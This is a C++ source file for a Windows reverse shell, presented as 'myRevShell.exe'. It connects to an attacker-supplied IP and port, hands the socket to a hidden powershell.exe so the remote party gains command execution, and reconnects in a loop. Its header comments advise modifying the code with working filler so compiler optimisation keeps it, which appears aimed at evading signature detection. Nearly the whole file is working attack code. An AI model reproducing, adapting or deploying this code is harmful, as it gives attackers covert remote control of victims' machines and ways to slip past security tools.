// Please modify the code and DONT USE AS-IS, no matter legal or illegal activity
// And modify it in a way so Compiler Optimmization doesn't do away with your extra code. 
// Calculate, print, whatever, do active things, not empty vars or renaming
// Usage: myRevShell.exe 192.168.158.52 9001

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <vector>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <locale>
#include <codecvt>

#pragma comment(lib, "Ws2_32.lib")  // statically compile this lib into the exe
#define DEFAULT_BUFLEN 1024


void Shell(char* revAddr, int revPort) {
    while (true) {
        Sleep(500);
        SOCKET localSocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2, 2), &version);
        localSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(revAddr);
        addr.sin_port = htons(revPort);

        if (WSAConnect(localSocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(localSocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(localSocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(localSocket);
                WSACleanup();
                continue;
            }
            else {
                std::wstring wProcess = L"powershell.exe";

                std::vector<wchar_t> vec(wProcess.begin(), wProcess.end());
                vec.push_back(L'\0');

                // Extrahiere wchar_t*
                LPWSTR lpwProcess = &vec[0];


                STARTUPINFO startUpInf;
                PROCESS_INFORMATION processInf;
                memset(&startUpInf, 0, sizeof(startUpInf));
                startUpInf.cb = sizeof(startUpInf);
                startUpInf.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                startUpInf.hStdInput = startUpInf.hStdOutput = startUpInf.hStdError = (HANDLE) localSocket;
                CreateProcess(NULL, lpwProcess, NULL, NULL, TRUE, 0, NULL, NULL, &startUpInf, &processInf);
                WaitForSingleObject(processInf.hProcess, INFINITE);
                CloseHandle(processInf.hProcess);
                CloseHandle(processInf.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(localSocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(localSocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}

int main(int argc, char **argv) {
    FreeConsole();
    if (argc < 3) exit(0);
    Shell(argv[1], atoi(argv[2]));
}

